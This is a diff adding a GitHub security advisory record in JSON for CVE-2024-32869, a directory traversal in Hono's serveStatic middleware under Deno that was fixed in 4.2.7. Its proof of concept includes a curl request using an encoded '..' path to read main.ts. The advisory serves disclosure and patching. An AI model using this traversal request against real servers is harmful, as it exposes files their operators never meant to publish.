@@ -1,0 +1,72 @@
+{
+  "id": "GHSA-3mpf-rcc7-5347",
+  "summary": "Hono vulnerable to Restricted Directory Traversal in serveStatic with deno",
+  "details": "### Summary\n\nWhen using serveStatic with deno, it is possible to directory traverse where main.ts is located.\n\nMy environment is configured as per this tutorial\nhttps://hono.dev/getting-started/deno\n\n### PoC\n\n```bash\n$ tree\n.\n\u251c\u2500\u2500 deno.json\n\u251c\u2500\u2500 deno.lock\n\u251c\u2500\u2500 main.ts\n\u251c\u2500\u2500 README.md\n\u2514\u2500\u2500 static\n    \u2514\u2500\u2500 a.txt\n```\n\nsource\n\n```jsx\nimport { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'\nimport { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'\n\nconst app = new Hono()\napp.use('/static/*', serveStatic({ root: './' }))\n\nDeno.serve(app.fetch)\n```\n\nrequest\n\n```bash\ncurl localhost:8000/static/%2e%2e/main.ts\n```\n\nresponse is content of main.ts\n\n### Impact\n\nUnexpected files are retrieved.",
+  "aliases": [
+    "CVE-2024-32869"
+  ],
+  "modified": "2024-04-24T14:26:48Z",
+  "published": "2024-04-23T16:20:49Z",
+  "related": [
+    "CVE-2024-32869"
+  ],
+  "database_specific": {
+    "nvd_published_at": "2024-04-23T21:15:48Z",
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-23T16:20:49Z"
+  },
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32869"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/honojs/hono"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "hono",
+        "ecosystem": "npm",
+        "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.2.7"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/04/GHSA-3mpf-rcc7-5347/GHSA-3mpf-rcc7-5347.json"
+      }
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+    }
+  ]
+}
